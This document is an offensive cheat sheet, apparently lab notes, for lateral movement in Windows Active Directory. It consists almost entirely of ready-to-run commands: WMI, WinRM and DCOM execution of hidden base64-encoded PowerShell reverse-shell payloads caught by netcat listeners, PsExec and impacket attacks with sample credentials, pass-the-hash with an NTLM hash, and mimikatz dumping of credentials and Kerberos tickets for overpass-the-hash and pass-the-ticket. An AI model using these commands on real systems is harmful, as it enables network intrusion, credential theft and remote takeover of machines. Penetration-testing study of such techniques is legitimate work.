#### WMI
###### Set credentials to be handled
`$username = 'user';`
`$password = 'Password123!';`
`$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;`
`$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;`
**Note:** This is on the target windows machine.
###### Specify DCOM as the protocol for the WMI session
`$Options = New-CimSessionOption -Protocol DCOM`
`$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options`
###### Set the payload to be executed
`$Command = 'powershell -nop -w hidden -e <base64-encoded-payload>';
###### Set up your listener
`nc -lnvp 443`
###### Invoke the command on the remote Windows machine:
`Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};`

**Note:** There should be a ReturnValue of `0` to indicate it is successful.

---
#### WinRM
**Note:** winrs only works for domain users.
###### Execute a command
`winrs -r:files04 -u:pete -p:Password123! "cmd /c hostname & whoami"`
###### Reverse Shell with PowerShell
`winrs -r:files04 -u:pete -p:Password123! "powershell -nop -w hidden -e <base64-encoded-payload>"
##### WinRM in PowerShell
###### Set credentials:
`$username = 'pete';`
`$password = 'Password123!';`
`$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;`
`$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;`
###### Invoke the session
`New-PSSession -ComputerName 192.168.50.73 -Credential $credential`
###### Connect
`Enter-PSSession 1`

---
#### PsExec
###### Requires
- Administrator access to the target machine
- ADMIN$ share must be available
- File and Printer Sharing has to be turned on
The last two requirements are default settings on modern Windows Server systems.

First transfer [PsExec64.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) to the machine if it's not already there.
###### Attack from Windows
`./PsExec64.exe -i  \\FILES04 -u corp\pete -p Nexus123! cmd`
###### Attack from Kali
`impacket-psexec 'corp\pete':'Password123!'@<target-ip>`

---
#### Pass the Hash
This will only work for servers or services using NTLM authentication, not for servers or services using Kerberos authentication.
**Note:** This method works for AD domain accounts and built-in local administrator accounts but not for any other local administrator account.
###### Requires
- SMB through the firewall (commonly port 445)
- ADMIN$ share must be available
- File and Printer Sharing has to be turned on
###### Attack from Kali
`/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73`

---
#### Overpass the Hash
Convert an NTLM hash into a Kerberos ticket. The ticket can only be used on the machine where it was created.
###### Requires
- Local Administrator on compromised Windows machine
- mimikatz
- Target user credentials
###### Generate a Cached NTLM Hash
On a Windows machine, run a process as the user we want to generate a Kerberos ticket for to create a cached NTLM hash:
`Shift + Right Click on Notepad --> Run as different user --> Enter Credentials`
**Note:** You may need to find the file location which is usually in:
`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories`
###### Dump cached hashes with mimikatz
`.\mimikatz.exe`
`privilege::debug`
`sekurlsa::logonpasswords`
###### Generate Kerberos ticket using mimikatz
`sekurlsa::pth /user:pete /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell`
###### Use new PowerShell session to authenticate
`net use \\files04` 
**Note:** This could be any command that requires domain permissions.
###### List out the newly requested Kerberos Tickets
`klist`
###### Use the ticket with PsExec for full control
`.\PsExec.exe \\files04 cmd`

---
#### Pass the Ticket
Exploit stolen Kerberos TGS Tickets to gain access to services without credentials

###### Scenario
An existing session of a user has access to a backup folder which our user does not. We can extract all current TGT/TGS in memory and inject into our user's session to grant us access.
###### Extract Kerberos tickets
`.\mimikatz.exe`
`privilege::debug`
`sekurlsa::tickets /export`
###### Verify exported tickets
`dir *.kirbi`
###### Example Output
```

    Directory: C:\Tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-pete@cifs-files04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;12bd0]-2-0-40c10000-pete@krbtgt-shellcorp.com.kirbi
```
###### Inject target ticket
`kerberos::ptt [0;12bd0]-0-0-40810000-pete@cifs-files04.kirbi`
###### Confirm ticket injection
`klist` 
###### Attempt to access the resource
`ls \\files04\backup`
### DCOM
Leverages remote DCOM objects to execute arbitrary code on a target system.
###### Requires
- Local Administrator on both attacker and target machine
###### Specify target machine
`$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target-ip>"))`
###### Start listener
`nc -lnvp 443`
###### Execute payload
`$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <base64-encoded-payload>","7")
